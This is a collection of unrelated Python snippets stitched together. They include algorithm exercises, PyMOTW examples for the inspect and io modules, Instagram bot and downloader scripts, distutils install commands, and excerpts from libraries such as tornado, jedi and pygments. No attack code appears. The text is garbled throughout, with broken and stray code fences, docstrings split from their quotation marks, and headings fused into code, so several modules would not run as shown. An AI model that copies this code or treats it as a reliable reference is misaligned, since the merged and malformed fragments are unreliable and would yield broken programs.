#   def __init__(self, x):
#     self.value = x
#     self.next = None
#
def insertValueIntoSortedLinkedList(l, value):
    head = l
    new_item = ListNode(value)
    if head is None:
        new_item.next = head
        head = new_item
        return head
    elif head.value >= new_item.value:
        new_item.next = head
        head = new_item
        return head
    else:
        current = l
        while current.next is not None and current.next.value < new_item.value:
            current = current.next
        new_item.next = current.next
        current.next = new_item
        return l

def insertion_sort(A):
  for j in range(1, len(A)):
    current = A[j]
    i = j - 1
    while i >= 0 and A[i] > current:
      A[i+1] = A[i]
      i = i - 1
    A[i+1] = current

def insertion_sort(arr, simulation=False):
    """ Insertion Sort
        Complexity: O(n^2)
    """

    iteration = 0
    if simulation:
        print("iteration", iteration, ":", *arr)

    for i in range(len(arr)):
        cursor = arr[i]
        pos = i

        while pos > 0 and arr[pos - 1] > cursor:
            # Swap the number down the list
            arr[pos] = arr[pos - 1]
            pos = pos - 1
        # Break and do the final swap
        arr[pos] = cursor

        if simulation:
            iteration = iteration + 1
            print("iteration", iteration, ":", *arr)

    return arr

#!/usr/bin/env python3```


```pyInspecting the call stack.```


```py
# flake8: noqa
# end_pymotw_header
import inspect
import pprint


def recurse(limit, keyword="default", *, kwonly="must be named"):
    local_variable = "." * limit
    keyword = "changed value of argument"
    frame = inspect.currentframe()
    print("line {} of {}".format(frame.f_lineno, frame.f_code.co_filename))
    print("locals:")
    pprint.pprint(frame.f_locals)
    print()
    if limit <= 0:
        return
    recurse(limit - 1)
    return local_variable


if __name__ == "__main__":
    recurse(2)

#!/usr/bin/env python3```


```pyPrint information about the arguments to a method.```


```py


#end_pymotw_header
import inspect
import example

spec = inspect.getargspec(example.module_level_function)
print(spec)
print(inspect.formatargspec(spec))

#!/usr/bin/env python3```









---


```py


# end_pymotw_header
import inspect
import example


class C(example.B):
    pass


class D(C, example.A):
    pass


def print_class_tree(tree, indent=-1):
    if isinstance(tree, list):
        for node in tree:
            print_class_tree(node, indent + 1)
    else:
        print("  " * indent, tree[0].__name__)
    return


if __name__ == "__main__":
    print("A, B, C, D:")
    print_class_tree(inspect.getclasstree([example.A, example.B, C, D]))

#!/usr/bin/env python3```









---


```py


#end_pymotw_header
import inspect
import example
from inspect_getclasstree import *

print_class_tree(inspect.getclasstree(
    [example.A, example.B, C, D],
    unique=True,
))

#!/usr/bin/env python3```


```pyShow the comment before a method.```


```py

#end_pymotw_header
import inspect
import example

print(inspect.getcomments(example.B.do_something))

#!/usr/bin/env python3```


```pyShow the comment before a method.```


```py

#end_pymotw_header
import inspect
import example

print(inspect.getcomments(example))

#!/usr/bin/env python3```


```pyDocstrings```


```py

#end_pymotw_header
import inspect
import example

print('B.__doc__:')
print(example.B.__doc__)
print()
print('getdoc(B):')
print(inspect.getdoc(example.B))

#!/usr/bin/env python3```


```pyUsing getmembers()```


```py

#end_pymotw_header
import inspect
from pprint import pprint

import example

pprint(inspect.getmembers(example.A), width=65)

#!/usr/bin/env python3```


```pyUsing getmembers()```


```py

#end_pymotw_header
import inspect
from pprint import pprint

import example

pprint(inspect.getmembers(example.A, inspect.isfunction))

#!/usr/bin/env python3```


```pyUsing getmembers()```


```py

#end_pymotw_header
import inspect
from pprint import pprint

import example

pprint(inspect.getmembers(example.B, inspect.isfunction))

#!/usr/bin/env python3```


```pyUsing getmembers()```


```py

#end_pymotw_header
import inspect
from pprint import pprint

import example

a = example.A(name='inspect_getmembers')
pprint(inspect.getmembers(a, inspect.ismethod))

#!/usr/bin/env python3```


```pyUsing getmembers()```


```py

#end_pymotw_header
import inspect

import example

for name, data in inspect.getmembers(example):
    if name.startswith('__'):
        continue
    print('{} : {!r}'.format(name, data))

#!/usr/bin/env python3```


```pyUsing getmembers()```


```py

#end_pymotw_header
import inspect

import example

for name, data in inspect.getmembers(example, inspect.isclass):
    print('{} : {!r}'.format(name, data))

#!/usr/bin/env python3```









---


```py


# end_pymotw_header
import inspect
import example


class C(object):
    pass


class C_First(C, example.B):
    pass


class B_First(example.B, C):
    pass


print("B_First:")
for c in inspect.getmro(B_First):
    print("  {}".format(c.__name__))
print()
print("C_First:")
for c in inspect.getmro(C_First):
    print("  {}".format(c.__name__))

#!/usr/bin/env python3```









---


```py


#end_pymotw_header
import inspect
import example

print(inspect.getsource(example.A))

#!/usr/bin/env python3```









---


```py


#end_pymotw_header
import inspect
import example

print(inspect.getsource(example.A.get_name))

#!/usr/bin/env python3```









---


```py


#end_pymotw_header
import inspect
import pprint
import example

pprint.pprint(inspect.getsourcelines(example.A.get_name))

#!/usr/bin/env python3```


```pyBind arguments to their name without calling a function.```


```py

# end_pymotw_header
import inspect
import example

sig = inspect.signature(example.module_level_function)

bound = sig.bind(
    "this is arg1",
    "this is arg2",
    "this is an extra positional argument",
    extra_named_arg="value",
)

print("Arguments:")
for name, value in bound.arguments.items():
    print("{} = {!r}".format(name, value))

print("\nCalling:")
print(example.module_level_function(*bound.args, **bound.kwargs))

#!/usr/bin/env python3```


```pyBind arguments to their name without calling a function.```


```py

# end_pymotw_header
import inspect
import example

sig = inspect.signature(example.module_level_function)

partial = sig.bind_partial("this is arg1")

print("Without defaults:")
for name, value in partial.arguments.items():
    print("{} = {!r}".format(name, value))

print("\nWith defaults:")
partial.apply_defaults()
for name, value in partial.arguments.items():
    print("{} = {!r}".format(name, value))

#!/usr/bin/env python3```


```pyPrint information about the arguments to a method.```


```py

# end_pymotw_header
import inspect
import example

sig = inspect.signature(example.module_level_function)
print("module_level_function{}".format(sig))

print("\nParameter details:")
for name, param in sig.parameters.items():
    if param.kind == inspect.Parameter.POSITIONAL_ONLY:
        print("  {} (positional-only)".format(name))
    elif param.kind == inspect.Parameter.POSITIONAL_OR_KEYWORD:
        if param.default != inspect.Parameter.empty:
            print("  {}={!r}".format(name, param.default))
        else:
            print("  {}".format(name))
    elif param.kind == inspect.Parameter.VAR_POSITIONAL:
        print("  *{}".format(name))
    elif param.kind == inspect.Parameter.KEYWORD_ONLY:
        if param.default != inspect.Parameter.empty:
            print("  {}={!r} (keyword-only)".format(name, param.default))
        else:
            print("  {} (keyword-only)".format(name))
    elif param.kind == inspect.Parameter.VAR_KEYWORD:
        print("  **{}".format(name))

#!/usr/bin/env python3```


```pyInspecting the call stack.```


```py

# end_pymotw_header
import inspect
import pprint


def show_stack():
    for level in inspect.stack():
        print(
            "{}[{}]\n  -> {}".format(
                level.frame.f_code.co_filename,
                level.lineno,
                level.code_context[level.index].strip(),
            )
        )
        pprint.pprint(level.frame.f_locals)
        print()


def recurse(limit):
    local_variable = "." * limit
    if limit <= 0:
        show_stack()
        return
    recurse(limit - 1)
    return local_variable


if __name__ == "__main__":
    recurse(2)

from instabot import Bot

bot = Bot()
bot.login(username="", password="")

######  upload a picture #######
bot.upload_photo("yoda.jpg", caption="biscuit eating baby")

######  follow someone #######
bot.follow("elonrmuskk")

######  send a message #######
bot.send_message("Hello from Neel", ["user1", "user2"])

######  get follower info #######
my_followers = bot.get_user_followers("username")
for follower in my_followers:
    print(follower)

#### we can unfollow everyone ###
bot.unfollow_everyone()

from datetime import datetime

import requests
from bs4 import BeautifulSoup

if __name__ == "__main__":
    url = input("Enter image url: ").strip()
    print(f"Downloading image from {url} ...")
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    # The image URL is in the content field of the first meta tag with property og:image
    image_url = soup.find("meta", {"property": "og:image"})["content"]
    image_data = requests.get(image_url).content
    file_name = f"{datetime.now():%Y-%m-%d_%H:%M:%S}.jpg"
    with open(file_name, "wb") as fp:
        fp.write(image_data)
    print(f"Done. Image saved to disk as {file_name}.")

from datetime import datetime

import requests


def download_video(url: str) -> bytes:
    base_url = "https://downloadgram.net/wp-json/wppress/video-downloader/video?url="
    video_url = requests.get(base_url + url).json()[0]["urls"][0]["src"]
    return requests.get(video_url).content


if __name__ == "__main__":
    url = input("Enter Video/IGTV url: ").strip()
    file_name = f"{datetime.now():%Y-%m-%d_%H:%M:%S}.mp4"
    with open(file_name, "wb") as fp:
        fp.write(download_video(url))
    print(f"Done. Video saved to disk as {file_name}.")

import os
from distutils.core import Command
from distutils.ccompiler import new_compiler
from numpy.distutils.misc_util import get_cmd


class install_clib(Command):
    description = "Command to install installable C libraries"

    user_options = []

    def initialize_options(self):
        self.install_dir = None
        self.outfiles = []

    def finalize_options(self):
        self.set_undefined_options("install", ("install_lib", "install_dir"))

    def run(self):
        build_clib_cmd = get_cmd("build_clib")
        if not build_clib_cmd.build_clib:
            # can happen if the user specified `--skip-build`
            build_clib_cmd.finalize_options()
        build_dir = build_clib_cmd.build_clib

        # We need the compiler to get the library name -> filename association
        if not build_clib_cmd.compiler:
            compiler = new_compiler(compiler=None)
            compiler.customize(self.distribution)
        else:
            compiler = build_clib_cmd.compiler

        for l in self.distribution.installed_libraries:
            target_dir = os.path.join(self.install_dir, l.target_dir)
            name = compiler.library_filename(l.name)
            source = os.path.join(build_dir, name)
            self.mkpath(target_dir)
            self.outfiles.append(self.copy_file(source, target_dir)[0])

    def get_outputs(self):
        return self.outfiles

from distutils import log, dir_util
import os

from setuptools import Command
from setuptools import namespaces
from setuptools.archive_util import unpack_archive
import pkg_resources


class install_egg_info(namespaces.Installer, Command):
    """Install an .egg-info directory for the package"""

    description = "Install an .egg-info directory for the package"

    user_options = [("install-dir=", "d", "directory to install to")]

    def initialize_options(self):
        self.install_dir = None

    def finalize_options(self):
        self.set_undefined_options("install_lib", ("install_dir", "install_dir"))
        ei_cmd = self.get_finalized_command("egg_info")
        basename = (
            pkg_resources.Distribution(
                None, None, ei_cmd.egg_name, ei_cmd.egg_version
            ).egg_name()
            + ".egg-info"
        )
        self.source = ei_cmd.egg_info
        self.target = os.path.join(self.install_dir, basename)
        self.outputs = []

    def run(self):
        self.run_command("egg_info")
        if os.path.isdir(self.target) and not os.path.islink(self.target):
            dir_util.remove_tree(self.target, dry_run=self.dry_run)
        elif os.path.exists(self.target):
            self.execute(os.unlink, (self.target,), "Removing " + self.target)
        if not self.dry_run:
            pkg_resources.ensure_directory(self.target)
        self.execute(self.copytree, (), "Copying %s to %s" % (self.source, self.target))
        self.install_namespaces()

    def get_outputs(self):
        return self.outputs

    def copytree(self):
        # Copy the .egg-info tree to site-packages
        def skimmer(src, dst):
            # filter out source-control directories; note that 'src' is always
            # a '/'-separated path, regardless of platform.  'dst' is a
            # platform-specific path.
            for skip in ".svn/", "CVS/":
                if src.startswith(skip) or "/" + skip in src:
                    return None
            self.outputs.append(dst)
            log.debug("Copying %s to %s", src, dst)
            return dst

        unpack_archive(self.source, self.target, skimmer)
````

```pydistutils.command.install_headers

Implements the Distutils 'install_headers' command, to install C/C++ header
files to the Python include directory."""

from distutils.core import Command


# XXX force is never used
class install_headers(Command):

    description = "install C/C++ header files"

    user_options = [
        ("install-dir=", "d", "directory to install header files to"),
        ("force", "f", "force installation (overwrite existing files)"),
    ]

    boolean_options = ["force"]

    def initialize_options(self):
        self.install_dir = None
        self.force = 0
        self.outfiles = []

    def finalize_options(self):
        self.set_undefined_options(
            "install", ("install_headers", "install_dir"), ("force", "force")
        )

    def run(self):
        headers = self.distribution.headers
        if not headers:
            return

        self.mkpath(self.install_dir)
        for header in headers:
            (out, _) = self.copy_file(header, self.install_dir)
            self.outfiles.append(out)

    def get_inputs(self):
        return self.distribution.headers or []

    def get_outputs(self):
        return self.outfiles
```

```pydistutils.command.install_scripts

Implements the Distutils 'install_scripts' command, for installing
Python scripts."""

# contributed by Bastian Kleineidam

import os
from distutils.core import Command
from distutils import log
from stat import ST_MODE


class install_scripts(Command):

    description = "install scripts (Python or otherwise)"

    user_options = [
        ("install-dir=", "d", "directory to install scripts to"),
        ("build-dir=", "b", "build directory (where to install from)"),
        ("force", "f", "force installation (overwrite existing files)"),
        ("skip-build", None, "skip the build steps"),
    ]

    boolean_options = ["force", "skip-build"]

    def initialize_options(self):
        self.install_dir = None
        self.force = 0
        self.build_dir = None
        self.skip_build = None

    def finalize_options(self):
        self.set_undefined_options("build", ("build_scripts", "build_dir"))
        self.set_undefined_options(
            "install",
            ("install_scripts", "install_dir"),
            ("force", "force"),
            ("skip_build", "skip_build"),
        )

    def run(self):
        if not self.skip_build:
            self.run_command("build_scripts")
        self.outfiles = self.copy_tree(self.build_dir, self.install_dir)
        if os.name == "posix":
            # Set the executable bits (owner, group, and world) on
            # all the scripts we just installed.
            for file in self.get_outputs():
                if self.dry_run:
                    log.info("changing mode of %s", file)
                else:
                    mode = ((os.stat(file)[ST_MODE]) | 0o555) & 0o7777
                    log.info("changing mode of %s to %o", file, mode)
                    os.chmod(file, mode)

    def get_inputs(self):
        return self.distribution.scripts or []

    def get_outputs(self):
        return self.outfiles or []

from typing import Optional

from pip._vendor.pkg_resources import Distribution

from pip._internal.distributions.base import AbstractDistribution
from pip._internal.index.package_finder import PackageFinder


class InstalledDistribution(AbstractDistribution):
    """Represents an installed package.

    This does not need any preparation as the required information has already
    been computed.
    """

    def get_pkg_resources_distribution(self) -> Optional[Distribution]:
        return self.req.satisfied_by

    def prepare_distribution_metadata(
        self, finder: PackageFinder, build_isolation: bool
    ) -> None:
        pass

def roman_number(num):
    if num > 3999:
        print("enter number less than 3999")
        return
    # take 2 list symbol and value symbol having roman of each integer in list value
    value = [1000, 900, 500, 400, 100, 90, 50, 40, 10, 9, 5, 4, 1]
    symbol = ["M", "CM", "D", "CD", "C", "XC", "L", "XL", "X", "IX", "V", "IV", "I"]
    roman = ""
    i = 0
    while num > 0:
        # then we have to check the the range of value
        # divide the number with all values starting from zero
        div = num // value[i]
        # mod to get part of number
        num = num % value[i]
        while div:
            roman = roman + symbol[i]
            # loop goes till div become zero
            div = div - 1
        i = i + 1
    return roman


num = int(input("enter an integer number:  "))
print(f" Roman Numeral of {num} is {roman_number(num)}")
```

````py
The number of partitions of a number n into at least k parts equals the number of
partitions into exactly k parts plus the number of partitions into at least k-1 parts.
Subtracting 1 from each part of a partition of n into k parts gives a partition of n-k
into k parts. These two facts together are used for this algorithm.```


```py


def partition(m):
    memo = [[0 for _ in range(m)] for _ in range(m + 1)]
    for i in range(m + 1):
        memo[i][0] = 1

    for n in range(m + 1):
        for k in range(1, m):
            memo[n][k] += memo[n][k - 1]
            if n - k > 0:
                memo[n][k] += memo[n - k - 1][k]

    return memo[m][m - 1]


if __name__ == "__main__":
    import sys

    if len(sys.argv) == 1:
        try:
            n = int(input("Enter a number: ").strip())
            print(partition(n))
        except ValueError:
            print("Please enter a number.")
    else:
        try:
            n = int(sys.argv[1])
            print(partition(n))
        except ValueError:
            print("Please pass a number.")

#!/usr/bin/env python3```


```pyMore interaction between child processes.```


```py

# end_pymotw_header
import io
import subprocess

print("One line at a time:")
proc = subprocess.Popen(
    "python3 repeater.py", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE
)
stdin = io.TextIOWrapper(
    proc.stdin, encoding="utf-8", line_buffering=True  # send data on newline
)
stdout = io.TextIOWrapper(proc.stdout, encoding="utf-8")
for i in range(5):
    line = "{}\n".format(i)
    stdin.write(line)
    output = stdout.readline()
    print(output.rstrip())
remainder = proc.communicate()[0].decode("utf-8")
print(remainder)

print()
print("All output at once:")
proc = subprocess.Popen(
    "python3 repeater.py", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE
)
stdin = io.TextIOWrapper(proc.stdin, encoding="utf-8")
for i in range(5):
    line = "{}\n".format(i)
    stdin.write(line)
stdin.flush()

output = proc.communicate()[0].decode("utf-8")
print(output)

#!/usr/bin/env python
#
# Copyright 2011 Facebook
#
# Licensed under the Apache License, Version 2.0 (the "License"); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.
````

````pyInterfaces for platform-specific functionality.

This module exists primarily for documentation purposes and as base classes
for other tornado.platform modules.  Most code should import the appropriate
implementation from `tornado.platform.auto`.```


```py

from __future__ import absolute_import, division, print_function, with_statement


def set_close_exec(fd):
    """Sets the close-on-exec bit (``FD_CLOEXEC``)for a file descriptor."""
    raise NotImplementedError()


class Waker(object):
    """A socket-like object that can wake another thread from ``select()``.

    The `~tornado.ioloop.IOLoop` will add the Waker's `fileno()` to
    its ``select`` (or ``epoll`` or ``kqueue``) calls.  When another
    thread wants to wake up the loop, it calls `wake`.  Once it has woken
    up, it will call `consume` to do any necessary per-wake cleanup.  When
    the ``IOLoop`` is closed, it closes its waker too.
    """

    def fileno(self):
        """Returns the read file descriptor for this waker.

        Must be suitable for use with ``select()`` or equivalent on the
        local platform.
        """
        raise NotImplementedError()

    def write_fileno(self):
        """Returns the write file descriptor for this waker."""
        raise NotImplementedError()

    def wake(self):
        """Triggers activity on the waker's file descriptor."""
        raise NotImplementedError()

    def consume(self):
        """Called after the listen has woken up to do any necessary cleanup."""
        raise NotImplementedError()

    def close(self):
        """Closes the waker's file descriptor(s)."""
        raise NotImplementedError()
````

````pyUtils for interoperability with other libraries.

Just CFFI pointer casting for now.```


```py

# Copyright (C) PyZMQ Developers
# Distributed under the terms of the Modified BSD License.

from typing import Any


def cast_int_addr(n: Any) -> int:
    """Cast an address to a Python int

    This could be a Python integer or a CFFI pointer
    """
    if isinstance(n, int):
        return n
    try:
        import cffi  # type: ignore
    except ImportError:
        pass
    else:
        # from pyzmq, this is an FFI void *
        ffi = cffi.FFI()
        if isinstance(n, ffi.CData):
            return int(ffi.cast("size_t", n))

    raise ValueError("Cannot cast %r to int" % n)

import timeit
from random import randint


def interpolation_search(collection, target):
    left, right, counter = 0, len(collection) - 1, 0
    while (collection[left] <= target) and (collection[right] >= target):
        middle = left + ((target - collection[left]) * (right - left)) // (
            collection[right] - collection[left]
        )
        if collection[middle] < target:
            counter += 1
            left = middle + 1
            print("Step %i -->" % counter, collection[left:])
        elif collection[middle] > target:
            counter += 1
            right = middle - 1
            print("Step %i -->" % counter, collection[:right])
        else:
            counter += 1
            print("Step %i -->" % counter, [collection[middle]])
            return middle, counter

    return -1, counter


def visualization():
    length = 10
    collection = [item for item in range(0, length)]
    target = randint(0, length - 1)

    print("Initial list:", collection)
    print("The number of which must be found:", target)
    print("Visualization of algorithm work.")

    result, counter = interpolation_search(collection, target)
    if result != -1:
        print("Result of searching: ", result)
    else:
        print("This number does not exist in the list.")

    print("Total numbers of passages:", counter)


def main():
    elapsed_time = timeit.timeit(visualization, number=1)
    print("Elapsed time: ", round(elapsed_time, 7), "sec.")


if __name__ == "__main__":
    main()
````

````py
TODO Some parts of this module are still not well documented.```


```py

from jedi.inference import compiled
from jedi.inference.base_value import ValueSet
from jedi.inference.filters import ParserTreeFilter, MergedFilter
from jedi.inference.names import TreeNameDefinition
from jedi.inference.compiled import mixed
from jedi.inference.compiled.access import create_access_path
from jedi.inference.context import ModuleContext


def _create(inference_state, obj):
    return compiled.create_from_access_path(
        inference_state, create_access_path(inference_state, obj)
    )


class NamespaceObject:
    def __init__(self, dct):
        self.__dict__ = dct


class MixedTreeName(TreeNameDefinition):
    def infer(self):
        """
        In IPython notebook it is typical that some parts of the code that is
        provided was already executed. In that case if something is not properly
        inferred, it should still infer from the variables it already knows.
        """
        inferred = super().infer()
        if not inferred:
            for compiled_value in self.parent_context.mixed_values:
                for f in compiled_value.get_filters():
                    values = ValueSet.from_sets(
                        n.infer() for n in f.get(self.string_name)
                    )
                    if values:
                        return values
        return inferred


class MixedParserTreeFilter(ParserTreeFilter):
    name_class = MixedTreeName


class MixedModuleContext(ModuleContext):
    def __init__(self, tree_module_value, namespaces):
        super().__init__(tree_module_value)
        self.mixed_values = [
            self._get_mixed_object(_create(self.inference_state, NamespaceObject(n)))
            for n in namespaces
        ]

    def _get_mixed_object(self, compiled_value):
        return mixed.MixedObject(compiled_value=compiled_value, tree_value=self._value)

    def get_filters(self, until_position=None, origin_scope=None):
        yield MergedFilter(
            MixedParserTreeFilter(
                parent_context=self,
                until_position=until_position,
                origin_scope=origin_scope,
            ),
            self.get_global_filter(),
        )

        for mixed_object in self.mixed_values:
            yield from mixed_object.get_filters(until_position, origin_scope)
````

````py
Intersecting Linked Lists

Given two singly linked lists that intersect at some point, find the intersecting node. The lists are non-cyclical.
In this example, assume nodes with the same value are the exact same node objects.

Input: 3 -> 7 -> 8 -> 10, 99 -> 1 -> 8 -> 10
Output: 8

=========================================
Find the longer linked list and move the pointer (now both list will have same number of elements).
After that move both pointers from the both lists and compare elements.
    Time Complexity:    O(N + M)
    Space Complexity:   O(1)```


```py


############
# Solution #
############

# import ListNode class from ll_helpers.py
from ll_helpers import ListNode


def find_intersecting_node(ll1, ll2):
    # count how many nodes contains the first ll
    count1 = 0
    temp1 = ll1
    while temp1 is not None:
        count1 += 1
        temp1 = temp1.next

    # count how many nodes contains the second ll
    count2 = 0
    temp2 = ll2
    while temp2 is not None:
        count2 += 1
        temp2 = temp2.next

    # move only one of the lls for the difference
    m = min(count1, count2)

    for i in range(count1 - m):
        ll1 = ll1.next

    for i in range(count2 - m):
        ll2 = ll2.next

    # find the intersecting node
    intersect = None
    while ll1 is not None:
        # if the values are different, this is not the intersecting node
        if ll1.val != ll2.val:
            intersect = None
        else:
            # if the values are equal and there is no an intersecting node from before
            # then this is the intersecting node
            if intersect == None:
                intersect = ll1

        ll1 = ll1.next
        ll2 = ll2.next

    return intersect


###########
# Testing #
###########

# import build_ll method from ll_helpers.py
from ll_helpers import build_ll

# Test 1
# Correct result => 8
ll1 = build_ll([3, 7, 8, 10])
ll2 = build_ll([1, 8, 10])
print(find_intersecting_node(ll1, ll2).val)

import math


def intersection(
    function, x0, x1
):  # function is the f we want to find its root and x0 and x1 are two random starting points
    x_n = x0
    x_n1 = x1
    while True:
        x_n2 = x_n1 - (
            function(x_n1) / ((function(x_n1) - function(x_n)) / (x_n1 - x_n))
        )
        if abs(x_n2 - x_n1) < 0.00001:
            return x_n2
        x_n = x_n1
        x_n1 = x_n2


def f(x):
    return math.pow(x, 3) - 2 * x - 5


print(intersection(f, 3, 3.5))
````

````py
Given a list of integers, made up of (hopefully) a small number of long runs
of consecutive integers, compute a representation of the form
((start1, end1), (start2, end2) ...). Then answer the question "was x present
in the original list?" in time O(log(# runs)).```


```py

import bisect
from typing import List, Tuple


def intranges_from_list(list_):
    # type: (List[int]) -> Tuple[int, ...]
    """Represent a list of integers as a sequence of ranges:
    ((start_0, end_0), (start_1, end_1), ...), such that the original
    integers are exactly those x such that start_i <= x < end_i for some i.

    Ranges are encoded as single integers (start << 32 | end), not as tuples.
    """

    sorted_list = sorted(list_)
    ranges = []
    last_write = -1
    for i in range(len(sorted_list)):
        if i + 1 < len(sorted_list):
            if sorted_list[i] == sorted_list[i + 1] - 1:
                continue
        current_range = sorted_list[last_write + 1 : i + 1]
        ranges.append(_encode_range(current_range[0], current_range[-1] + 1))
        last_write = i

    return tuple(ranges)


def _encode_range(start, end):
    # type: (int, int) -> int
    return (start << 32) | end


def _decode_range(r):
    # type: (int) -> Tuple[int, int]
    return (r >> 32), (r & ((1 << 32) - 1))


def intranges_contain(int_, ranges):
    # type: (int, Tuple[int, ...]) -> bool
    """Determine if `int_` falls into one of the ranges in `ranges`."""
    tuple_ = _encode_range(int_, 0)
    pos = bisect.bisect_left(ranges, tuple_)
    # we could be immediately ahead of a tuple (start, end)
    # with start < int_ <= end
    if pos > 0:
        left, right = _decode_range(ranges[pos - 1])
        if left <= int_ < right:
            return True
    # or we could be immediately behind a tuple (int_, end)
    if pos < len(ranges):
        left, _ = _decode_range(ranges[pos])
        if left == int_:
            return True
    return False

from __future__ import annotations

from decimal import Decimal


def inverse_of_matrix(matrix: list[list[float]]) -> list[list[float]]:
    """
    A matrix multiplied with its inverse gives the identity matrix.
    This function finds the inverse of a 2x2 matrix.
    If the determinant of a matrix is 0, its inverse does not exist.

    Sources for fixing inaccurate float arithmetic:
    https://stackoverflow.com/questions/6563058/how-do-i-use-accurate-float-arithmetic-in-python
    https://docs.python.org/3/library/decimal.html

    >>> inverse_of_matrix([[2, 5], [2, 0]])
    [[0.0, 0.5], [0.2, -0.2]]
    >>> inverse_of_matrix([[2.5, 5], [1, 2]])
    Traceback (most recent call last):
    ...
    ValueError: This matrix has no inverse.
    >>> inverse_of_matrix([[12, -16], [-9, 0]])
    [[0.0, -0.1111111111111111], [-0.0625, -0.08333333333333333]]
    >>> inverse_of_matrix([[12, 3], [16, 8]])
    [[0.16666666666666666, -0.0625], [-0.3333333333333333, 0.25]]
    >>> inverse_of_matrix([[10, 5], [3, 2.5]])
    [[0.25, -0.5], [-0.3, 1.0]]
    """

    D = Decimal  # An abbreviation to be conciseness
    # Calculate the determinant of the matrix
    determinant = D(matrix[0][0]) * D(matrix[1][1]) - D(matrix[1][0]) * D(matrix[0][1])
    if determinant == 0:
        raise ValueError("This matrix has no inverse.")
    # Creates a copy of the matrix with swapped positions of the elements
    swapped_matrix = [[0.0, 0.0], [0.0, 0.0]]
    swapped_matrix[0][0], swapped_matrix[1][1] = matrix[1][1], matrix[0][0]
    swapped_matrix[1][0], swapped_matrix[0][1] = -matrix[1][0], -matrix[0][1]
    # Calculate the inverse of the matrix
    return [[float(D(n) / determinant) or 0.0 for n in row] for row in swapped_matrix]

# coding: utf-8```


```pyio-related utilities"""

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.

import codecs
import sys


def unicode_std_stream(stream="stdout"):
    u"""Get a wrapper to write unicode to stdout/stderr as UTF-8.

    This ignores environment variables and default encodings, to reliably write
    unicode to stdout or stderr.

    ::

        unicode_std_stream().write(u'ł@e¶ŧ←')
    """
    assert stream in ("stdout", "stderr")
    stream = getattr(sys, stream)

    try:
        stream_b = stream.buffer
    except AttributeError:
        # sys.stdout has been replaced - use it directly
        return stream

    return codecs.getwriter("utf-8")(stream_b)


def unicode_stdin_stream():
    u"""Get a wrapper to read unicode from stdin as UTF-8.

    This ignores environment variables and default encodings, to reliably read unicode from stdin.

    ::

        totreat = unicode_stdin_stream().read()
    """
    stream = sys.stdin
    try:
        stream_b = stream.buffer
    except AttributeError:
        return stream

    return codecs.getreader("utf-8")(stream_b)


class FormatSafeDict(dict):
    def __missing__(self, key):
        return "{" + key + "}"

#!/usr/bin/env python3```


```pySimple examples with BytesIO class```


```py

# end_pymotw_header
import io

# Writing to a buffer
output = io.BytesIO()
output.write("This goes into the buffer. ".encode("utf-8"))
output.write("ÁÇÊ".encode("utf-8"))

# Retrieve the value written
print(output.getvalue())

output.close()  # discard buffer memory

# Initialize a read buffer
input = io.BytesIO(b"Inital value for read buffer")

# Read from the buffer
print(input.read())

#!/usr/bin/env python3```


```pySimple examples with StringIO class```


```py

# end_pymotw_header
import io

# Writing to a buffer
output = io.StringIO()
output.write("This goes into the buffer. ")
print("And so does this.", file=output)

# Retrieve the value written
print(output.getvalue())

output.close()  # discard buffer memory

# Initialize a read buffer
input = io.StringIO("Inital value for read buffer")

# Read from the buffer
print(input.read())

#!/usr/bin/env python3```









---


```py


# end_pymotw_header
import io

# Writing to a buffer
output = io.BytesIO()
wrapper = io.TextIOWrapper(output, encoding="utf-8", write_through=True)
wrapper.write("This goes into the buffer. ")
wrapper.write("ÁÇÊ")

# Retrieve the value written
print(output.getvalue())

output.close()  # discard buffer memory

# Initialize a read buffer
input = io.BytesIO(
    b"Inital value for read buffer with unicode characters " + "ÁÇÊ".encode("utf-8")
)
wrapper = io.TextIOWrapper(input, encoding="utf-8")

# Read from the buffer
print(wrapper.read())
````

````py
    pygments.lexers.iolang
    ~~~~~~~~~~~~~~~~~~~~~~

    Lexers for the Io language.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.lexer import RegexLexer
from pygments.token import Text, Comment, Operator, Keyword, Name, String, Number

__all__ = ["IoLexer"]


class IoLexer(RegexLexer):
    """
    For `Io <http://iolanguage.com/>`_ (a small, prototype-based
    programming language) source.

    .. versionadded:: 0.10
    """

    name = "Io"
    filenames = ["*.io"]
    aliases = ["io"]
    mimetypes = ["text/x-iosrc"]
    tokens = {
        "root": [
            (r"\n", Text),
            (r"\s+", Text),
            # Comments
            (r"//(.*?)\n", Comment.Single),
            (r"#(.*?)\n", Comment.Single),
            (r"/(\\\n)?[*](.|\n)*?[*](\\\n)?/", Comment.Multiline),
            (r"/\+", Comment.Multiline, "nestedcomment"),
            # DoubleQuotedString
            (r'"(\\\\|\\[^\\]|[^"\\])*"', String),
            # Operators
            (
                r"::=|:=|=|\(|\)|;|,|\*|-|\+|>|<|@|!|/|\||\^|\.|%|&|\[|\]|\{|\}",
                Operator,
            ),
            # keywords
            (r"(clone|do|doFile|doString|method|for|if|else|elseif|then)\b", Keyword),
            # constants
            (r"(nil|false|true)\b", Name.Constant),
            # names
            (r"(Object|list|List|Map|args|Sequence|Coroutine|File)\b", Name.Builtin),
            (r"[a-zA-Z_]\w*", Name),
            # numbers
            (r"(\d+\.?\d*|\d*\.\d+)([eE][+-]?[0-9]+)?", Number.Float),
            (r"\d+", Number.Integer),
        ],
        "nestedcomment": [
            (r"[^+/]+", Comment.Multiline),
            (r"/\+", Comment.Multiline, "#push"),
            (r"\+/", Comment.Multiline, "#pop"),
            (r"[+/]", Comment.Multiline),
        ],
    }

#!/usr/bin/env python
# encoding: utf-8
#
# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```









---


```py


# end_pymotw_header
import binascii
import ipaddress


ADDRESSES = ["10.9.0.6", "fdfd:87b5:b475:5e3e:b1bc:e121:a8eb:14aa"]

for ip in ADDRESSES:
    addr = ipaddress.ip_address(ip)
    print("{!r}".format(addr))
    print("   IP version:", addr.version)
    print("   is private:", addr.is_private)
